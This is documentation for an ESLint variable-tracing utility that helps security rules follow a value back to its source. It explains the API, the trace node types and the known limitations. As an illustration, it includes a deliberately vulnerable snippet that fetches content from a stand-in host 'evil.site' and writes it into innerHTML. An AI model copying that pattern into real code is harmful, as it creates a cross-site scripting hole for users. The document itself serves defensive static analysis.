# Tracing algorithm

When writing ESLint rules (especially those that needs to ensure that specific
information does not flow to specific nodes) it often becomes necessary to be
able to trace the definition of an expression back to its source.

This is where this utility comes into play. Consider the following code snippet
that introduces a cross-site scripting vulnerability:

```ts
let aValue = "I am totally safe";

if (Math.random() > 0.5) {
  aValue = "Still safe!";
} else if (Math.randome() > 0.8) {
  aValue = await (await fetch("evil.site")).text();
}

document.body.innerHTML = aValue;
```

When simply observing the value that `innerHTML` is assigned to it is not
immediately obvious that the code may introduce a cross-site scripting attack.
Of course a rule could simply flag it as potentially vulnerable without
determining the source of the value, but that may result in a bunch of false
positives.

Ideally we would like to easily determine that the assigned value could take the
form of either `I am totally safe`, `Still safe` or `fetch()`. Only then would
we be able to see that the value could potentially take the form of uncontrolled
input through the fetch request.

This is exactly what the `traceVariable` utility aims to help with. In particular,
if we run this function on the value `aValue` from the snippet above, then the
output below may be printed to the console (if configured):

```bash
root --> aValue (Variable/1) --> "I am totally safe" (Literal/2/constant/reassign)

root --> aValue (Variable/1) --> "Still safe!" (Literal/2/constant/reassign)

root --> aValue (Variable/1) --> fetch (/7/reassign) --> Global(fetch)
```

## Usage

The variable tracer can be used as seen below:

```ts
traceVariable(
  {
    node,
    context, // eslint rule-context
  },
  {
    onNodeVisited: (node: TraceNode) => {
      // In case you're not interested in following the trace that the current
      // variable you can return "stopFollowingVariable: true" in order to
      // preserve performance.
      // However, if you wish to stop the trace altogehter you can return
      // "halt: true".
      return { stopFollowingVariable: false; halt: true };
    },
    onFinished: () => {
      // ...
    }
  }
);
```

Where the callback `onNodeVisited` is called every time the tracer encountes a
new [Trace Node](#trace-nodes). In other words the callback is triggered every
time we encounter a new definition of the value that we are tracing, if we reach
a source or if we cannot trace any further.

However, often it is necessary to know the context of the whole `Trace` that the
function is following, and not just the current node that we are visiting. In
this case the callbacks can be decorated with the `withTrace` function that
introduces traces into the context. A `Trace` is known as the path we followed
from the node that we trace back to a given source, including all intermediate
definitions.

```ts
let targetNode: TSESTree.Node | undefined;

traceVariable(
  {
    node,
    context,
  },
  withTrace({
    onNodeVisited: (currentTrace: [RootNode, ...TraceNode[]], node: TraceNode) => {
      if (isNodeTerminalNode(node) && isIdentifier(node.astNode)) {
        targetNode = node.astNode;

        return { halt: true };
      }
    },
    onTraceFinished: (trace: [RootNode, ...TraceNode[]]) => {
      // may, for example, output "root --> aValue (Variable/1) --> fetch (/7/reassign) --> Global(fetch)"
      printTrace(trace);

      // onTraceFinished may also return "stopFollowingVariable" and "halt"
      return { halt: true };
    },
    onFinished: () => {
      // ...
    }
  })
);
```

Do note that the tracing executes efficiently and **synchronously**. This means
that the callbacks that you have defined may set the value of variables defined
before the call to `traceVariable` as seen in the code snippet above.

## Trace Nodes

The nodes returned in the tracer callbacks are *not* regular ESLint ESTree nodes.
Instead they are a special node known as a `Trace Node`.

Trace nodes exists as a variaty of different types as specified below.

### Variable Node

Variable Nodes are generated every time we can trace the definition of a value
to another variable.

This Node will always be the "body" of a trace from the target value to the source.

### Terminal Node

Terminal Nodes can be considered the end of a trace, and they can take several
different forms, specifying different data based on the type of the terminal.

In particular the following Terminal Nodes exist:

* ConstantTerminalNode
* ImportTerminalNode
* GlobalTerminalNode
* UnresolvedTerminalNode
* NodeTerminalNode

### Root Node

The root node exists will always be the start of a `Trace`. It does not contain
any particular information itself, but is simply a specification that it is the
start of a Trace.

## Support

The algorithm is still a work in progress and thus not perfect. The current state
of known issues can be tracked by observing the unit tests provided for the tracer.

We also believe it may be relevant to re-think the API of the function to shift
away from being callback based since it may contribute to introduce
[Callback Hell](http://callbackhell.com/) in rule implementations.

However, with that being said, then the tracer supports a significant subset of
the JavaScript/TypeScript language inculding the following:

* Arrays *(including rest and spread operations)*
* Objects *(including rest and spread operations)*
* Expressions *(all)*
* Functions *(including parameter to argument tracing)*
* Import/Export *(with limited support for dynamic import and require() statements)*
* Statements *(such as ForOfLoops)*
* Globals *(e.g. Object/Promise/fetch etc.)*
* Limited understanding of vanilla JavaScript constructs *(e.g. `[].concat([])` means that we should trace both arrays)*
* Third party packages *(e.g. React, specifying relationships between `[getter, setter] = useState()` etc.)*

We are currently aware of the follwing limitations:

* Shortcomings in some of the existing handlers
* Mutability *(we do not detect mutations of traced nodes)*
* Exhaustive understanding of vanilla JavaScript constructs *(such as Set/Map etc.)*
* Lack of integration with more third party packages

## Implementation details

High level overview

### Visitors

### Handlers

### Overrides
